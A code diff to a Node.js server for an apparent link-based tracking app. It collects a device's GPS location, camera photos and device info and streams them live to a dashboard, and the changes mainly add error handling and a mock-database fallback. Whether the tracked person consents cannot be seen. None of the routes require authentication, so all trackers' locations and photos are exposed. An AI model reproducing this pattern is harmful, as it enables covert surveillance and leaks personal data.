@@ -33,204 +33,268 @@ async function connectDB() {
   if (db) return db;
   if (!MONGODB_URI) {
     console.warn('⚠️  MONGODB_URI not found! Data will NOT persist on Vercel.');
-    db = {
-      collection: (name) => ({
-        find: (query = {}) => {
-          let results = mockStore[name];
-          if (query.trackerId) results = results.filter(r => r.trackerId === query.trackerId);
-          if (query.id) results = results.filter(r => r.id === query.id);
-          return {
-            toArray: async () => results,
-            limit: (n) => ({ toArray: async () => results.slice(0, n) })
-          };
-        },
-        findOne: async (query) => {
-          if (query.id) return mockStore[name].find(r => r.id === query.id);
-          if (query.trackerId) return mockStore[name].find(r => r.trackerId === query.trackerId);
-          return null;
-        },
-        insertOne: async (doc) => { mockStore[name].push(doc); return { insertedId: doc.id }; },
-        updateOne: async (query, update) => {
-          const doc = mockStore[name].find(r => r.id === query.id);
-          if (doc && update.$set) Object.assign(doc, update.$set);
-          return { modifiedCount: 1 };
-        },
-        deleteOne: async (query) => {
-          const idx = mockStore[name].findIndex(r => r.id === query.id);
-          if (idx !== -1) mockStore[name].splice(idx, 1);
-          return { deletedCount: 1 };
-        },
-        deleteMany: async (query) => {
-           if (query.trackerId) {
-             mockStore[name] = mockStore[name].filter(r => r.trackerId !== query.trackerId);
-           }
-           return { deletedCount: 1 };
-        },
-        countDocuments: async (query) => {
-          return mockStore[name].filter(r => r.trackerId === query.trackerId).length;
-        }
-      })
-    };
+    db = createMockDB();
     return db;
   }
-  const client = new MongoClient(MONGODB_URI);
-  await client.connect();
-  db = client.db(DATABASE_NAME);
-  console.log('✅ Connected to MongoDB Atlas');
-  return db;
+  try {
+    const client = new MongoClient(MONGODB_URI, {
+      connectTimeoutMS: 5000,
+      serverSelectionTimeoutMS: 5000
+    });
+    await client.connect();
+    db = client.db(DATABASE_NAME);
+    console.log('✅ Connected to MongoDB Atlas');
+    return db;
+  } catch (err) {
+    console.error('❌ MongoDB Connection Error:', err.message);
+    db = createMockDB(); // Fallback to mock if DB fails
+    return db;
+  }
+}
+
+function createMockDB() {
+  return {
+    collection: (name) => ({
+      find: (query = {}) => {
+        let results = mockStore[name] || [];
+        if (query.trackerId) results = results.filter(r => r.trackerId === query.trackerId);
+        if (query.id) results = results.filter(r => r.id === query.id);
+        return {
+          toArray: async () => results,
+          limit: (n) => ({ toArray: async () => results.slice(0, n) })
+        };
+      },
+      findOne: async (query) => {
+        const store = mockStore[name] || [];
+        if (query.id) return store.find(r => r.id === query.id);
+        if (query.trackerId) return store.find(r => r.trackerId === query.trackerId);
+        return null;
+      },
+      insertOne: async (doc) => { (mockStore[name] = mockStore[name] || []).push(doc); return { insertedId: doc.id }; },
+      updateOne: async (query, update) => {
+        const store = mockStore[name] || [];
+        const doc = store.find(r => r.id === query.id);
+        if (doc && update.$set) Object.assign(doc, update.$set);
+        return { modifiedCount: 1 };
+      },
+      deleteOne: async (query) => {
+        const store = mockStore[name] || [];
+        const idx = store.findIndex(r => r.id === query.id);
+        if (idx !== -1) store.splice(idx, 1);
+        return { deletedCount: 1 };
+      },
+      deleteMany: async (query) => {
+        if (query.trackerId) {
+          mockStore[name] = (mockStore[name] || []).filter(r => r.trackerId !== query.trackerId);
+        }
+        return { deletedCount: 1 };
+      },
+      countDocuments: async (query) => {
+        const store = mockStore[name] || [];
+        return store.filter(r => r.trackerId === query.trackerId).length;
+      }
+    })
+  };
 }
 
 async function getCollection(name) {
-  const database = await connectDB();
-  return database.collection(name);
+  try {
+    const database = await connectDB();
+    return database.collection(name);
+  } catch (e) {
+    console.error('Collection Access Error:', e.message);
+    return createMockDB().collection(name);
+  }
 }
 
 // ── Unified Helpers ──────────────────────────────────────────
 
 async function getTracker(id) {
-  const col = await getCollection('trackers');
-  return await col.findOne({ id });
+  try {
+    const col = await getCollection('trackers');
+    return await col.findOne({ id });
+  } catch (e) {
+    return null;
+  }
 }
 
 async function updateTrackerLocation(trackerId, entry) {
-  const tCol = await getCollection('trackers');
-  const lCol = await getCollection('locations');
-  const tracker = await getTracker(trackerId);
-  if (!tracker) return false;
+  try {
+    const tCol = await getCollection('trackers');
+    const lCol = await getCollection('locations');
+    const tracker = await getTracker(trackerId);
+    if (!tracker) return false;
 
-  await lCol.insertOne({ trackerId, ...entry });
-  await tCol.updateOne({ id: trackerId }, { $set: { lastLocation: entry, active: true } });
+    await lCol.insertOne({ trackerId, ...entry });
+    await tCol.updateOne({ id: trackerId }, { $set: { lastLocation: entry, active: true } });
 
-  io.to(`tracker:${trackerId}`).emit('location-received', { trackerId, location: entry });
-  io.emit('tracker-updated', { ...tracker, lastLocation: entry, active: true });
-  return true;
+    io.to(`tracker:${trackerId}`).emit('location-received', { trackerId, location: entry });
+    io.emit('tracker-updated', { ...tracker, lastLocation: entry, active: true });
+    return true;
+  } catch (e) {
+    console.error('Update Location Error:', e);
+    return false;
+  }
 }
 
 async function addPhoto(trackerId, photo) {
-  const pCol = await getCollection('photos');
-  const tracker = await getTracker(trackerId);
-  if (!tracker) return false;
+  try {
+    const pCol = await getCollection('photos');
+    const tracker = await getTracker(trackerId);
+    if (!tracker) return false;
 
-  await pCol.insertOne({ trackerId, ...photo });
-  io.to(`tracker:${trackerId}`).emit('photo-received', { trackerId, photo });
-  return true;
+    await pCol.insertOne({ trackerId, ...photo });
+    io.to(`tracker:${trackerId}`).emit('photo-received', { trackerId, photo });
+    return true;
+  } catch (e) {
+    console.error('Add Photo Error:', e);
+    return false;
+  }
 }
 
 async function updateDeviceInfo(trackerId, info) {
-  const tCol = await getCollection('trackers');
-  const tracker = await getTracker(trackerId);
-  if (!tracker) return false;
+  try {
+    const tCol = await getCollection('trackers');
+    const tracker = await getTracker(trackerId);
+    if (!tracker) return false;
 
-  if (MONGODB_URI) {
     await tCol.updateOne({ id: trackerId }, { $set: { deviceInfo: info } });
-  } else {
-    tracker.deviceInfo = info;
+    io.emit('tracker-updated', { ...tracker, deviceInfo: info });
+    return true;
+  } catch (e) {
+    console.error('Update Device Error:', e);
+    return false;
   }
-
-  io.emit('tracker-updated', { ...tracker, deviceInfo: info });
-  return true;
 }
 
 // ── API Routes (Serverless Friendly) ──────────────────────────
 
-// Location update from tracked device
 app.post('/api/tracker/:id/location', async (req, res) => {
-  const { latitude, longitude, accuracy, altitude, speed, heading } = req.body;
-  const entry = {
-    latitude, longitude, accuracy, altitude, speed, heading,
-    timestamp: new Date().toISOString()
-  };
-  const success = await updateTrackerLocation(req.params.id, entry);
-  res.json({ success });
+  try {
+    const { latitude, longitude, accuracy, altitude, speed, heading } = req.body;
+    const entry = {
+      latitude, longitude, accuracy, altitude, speed, heading,
+      timestamp: new Date().toISOString()
+    };
+    const success = await updateTrackerLocation(req.params.id, entry);
+    res.json({ success });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
 });
 
-// Photo capture from tracked device
 app.post('/api/tracker/:id/photo', async (req, res) => {
-  const { image, facing } = req.body;
-  const entry = { image, facing, timestamp: new Date().toISOString() };
-  const success = await addPhoto(req.params.id, entry);
-  res.json({ success });
+  try {
+    const { image, facing } = req.body;
+    const entry = { image, facing, timestamp: new Date().toISOString() };
+    const success = await addPhoto(req.params.id, entry);
+    res.json({ success });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
 });
 
-// Device info from tracked device
 app.post('/api/tracker/:id/info', async (req, res) => {
-  const success = await updateDeviceInfo(req.params.id, req.body);
-  res.json({ success });
+  try {
+    const success = await updateDeviceInfo(req.params.id, req.body);
+    res.json({ success });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
 });
 
 // ── API Routes (Standard) ────────────────────────────────────
 
-// Create a new tracker session
 app.post('/api/tracker/create', async (req, res) => {
-  const id = uuidv4().slice(0, 8);
-  const tracker = {
-    id,
-    name: req.body.name || `Tracker ${id}`,
-    createdAt: new Date().toISOString(),
-    active: false,
-    lastLocation: null,
-    deviceInfo: null
-  };
-  
-  const col = await getCollection('trackers');
-  await col.insertOne(tracker);
-  
-  res.json({ success: true, tracker, link: `${req.protocol}://${req.get('host')}/track/${id}` });
-});
-
-// Get all trackers
-app.get('/api/trackers', async (req, res) => {
-  const col = await getCollection('trackers');
-  const lCol = await getCollection('locations');
-  const pCol = await getCollection('photos');
-
-  const all = await col.find({}).toArray();
-  for (const t of all) {
-    t.locationCount = await lCol.countDocuments({ trackerId: t.id });
-    t.photoCount = await pCol.countDocuments({ trackerId: t.id });
+  try {
+    const id = uuidv4().slice(0, 8);
+    const tracker = {
+      id,
+      name: req.body.name || `Tracker ${id}`,
+      createdAt: new Date().toISOString(),
+      active: false,
+      lastLocation: null,
+      deviceInfo: null
+    };
+    
+    const col = await getCollection('trackers');
+    await col.insertOne(tracker);
+    
+    // Fixed link generation for Vercel (prefer HTTPS)
+    const host = req.get('host');
+    const protocol = host.includes('localhost') ? 'http' : 'https';
+    const link = `${protocol}://${host}/track/${id}`;
+    
+    res.json({ success: true, tracker, link });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
   }
-  res.json(all);
 });
 
-// Get single tracker
+app.get('/api/trackers', async (req, res) => {
+  try {
+    const col = await getCollection('trackers');
+    const lCol = await getCollection('locations');
+    const pCol = await getCollection('photos');
+
+    const all = await col.find({}).toArray();
+    for (const t of all) {
+      t.locationCount = await lCol.countDocuments({ trackerId: t.id });
+      t.photoCount = await pCol.countDocuments({ trackerId: t.id });
+    }
+    res.json(all);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
 app.get('/api/tracker/:id', async (req, res) => {
-  const tracker = await getTracker(req.params.id);
-  if (!tracker) return res.status(404).json({ error: 'Tracker not found' });
-  
-  const lCol = await getCollection('locations');
-  const pCol = await getCollection('photos');
-  const result = { ...tracker };
-  result.locations = await lCol.find({ trackerId: req.params.id }).limit(100).toArray();
-  result.photos = await pCol.find({ trackerId: req.params.id }).limit(50).toArray();
-  
-  res.json(result);
+  try {
+    const tracker = await getTracker(req.params.id);
+    if (!tracker) return res.status(404).json({ error: 'Tracker not found' });
+    
+    const lCol = await getCollection('locations');
+    const pCol = await getCollection('photos');
+    const result = { ...tracker };
+    result.locations = await lCol.find({ trackerId: req.params.id }).limit(100).toArray();
+    result.photos = await pCol.find({ trackerId: req.params.id }).limit(50).toArray();
+    
+    res.json(result);
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
 });
 
-// Delete tracker
 app.delete('/api/tracker/:id', async (req, res) => {
-  const id = req.params.id;
-  const col = await getCollection('trackers');
-  const lCol = await getCollection('locations');
-  const pCol = await getCollection('photos');
+  try {
+    const id = req.params.id;
+    const col = await getCollection('trackers');
+    const lCol = await getCollection('locations');
+    const pCol = await getCollection('photos');
 
-  await col.deleteOne({ id });
-  await lCol.deleteMany({ trackerId: id });
-  await pCol.deleteMany({ trackerId: id });
-  
-  io.emit('tracker-deleted', id);
-  res.json({ success: true });
+    await col.deleteOne({ id });
+    await lCol.deleteMany({ trackerId: id });
+    await pCol.deleteMany({ trackerId: id });
+    
+    io.emit('tracker-deleted', id);
+    res.json({ success: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
 });
 
 // ── Socket.io (Hybrid) ──────────────────────────────────────
 
 io.on('connection', (socket) => {
   socket.on('join-tracker', async (trackerId) => {
-    socket.join(`tracker:${trackerId}`);
-    socket.trackerId = trackerId;
-    const tracker = await getTracker(trackerId);
-    if (tracker) {
-      await updateDeviceInfo(trackerId, tracker.deviceInfo || {});
-    }
+    try {
+      socket.join(`tracker:${trackerId}`);
+      socket.trackerId = trackerId;
+      const tracker = await getTracker(trackerId);
+      if (tracker) {
+        await updateDeviceInfo(trackerId, tracker.deviceInfo || {});
+      }
+    } catch (e) {}
   });
 
   socket.on('watch-tracker', (trackerId) => {
@@ -238,35 +302,47 @@ io.on('connection', (socket) => {
   });
 
   socket.on('location-update', async (data) => {
-    await updateTrackerLocation(data.trackerId, { ...data, timestamp: new Date().toISOString() });
+    try {
+      await updateTrackerLocation(data.trackerId, { ...data, timestamp: new Date().toISOString() });
+    } catch (e) {}
   });
 
   socket.on('photo-capture', async (data) => {
-    await addPhoto(data.trackerId, { ...data, timestamp: new Date().toISOString() });
+    try {
+      await addPhoto(data.trackerId, { ...data, timestamp: new Date().toISOString() });
+    } catch (e) {}
   });
 
   socket.on('device-info', async (data) => {
-    await updateDeviceInfo(data.trackerId, data.info);
+    try {
+      await updateDeviceInfo(data.trackerId, data.info);
+    } catch (e) {}
   });
 
   socket.on('disconnect', async () => {
-    if (socket.trackerId) {
-      const tracker = await getTracker(socket.trackerId);
-      if (tracker) {
-        const tCol = await getCollection('trackers');
-        await tCol.updateOne({ id: socket.trackerId }, { $set: { active: false } });
-        io.emit('tracker-updated', { ...tracker, active: false });
+    try {
+      if (socket.trackerId) {
+        const tracker = await getTracker(socket.trackerId);
+        if (tracker) {
+          const tCol = await getCollection('trackers');
+          await tCol.updateOne({ id: socket.trackerId }, { $set: { active: false } });
+          io.emit('tracker-updated', { ...tracker, active: false });
+        }
       }
-    }
+    } catch (e) {}
   });
 });
 
 
 // ── Track page route ────────────────────────────────────────
 app.get('/track/:id', async (req, res) => {
-  const tracker = await getTracker(req.params.id);
-  if (!tracker) return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
-  res.sendFile(path.join(__dirname, 'public', 'track.html'));
+  try {
+    const tracker = await getTracker(req.params.id);
+    if (!tracker) return res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
+    res.sendFile(path.join(__dirname, 'public', 'track.html'));
+  } catch (e) {
+    res.status(500).send("Critical error loading track page");
+  }
 });
 
 const PORT = process.env.PORT || 3000;
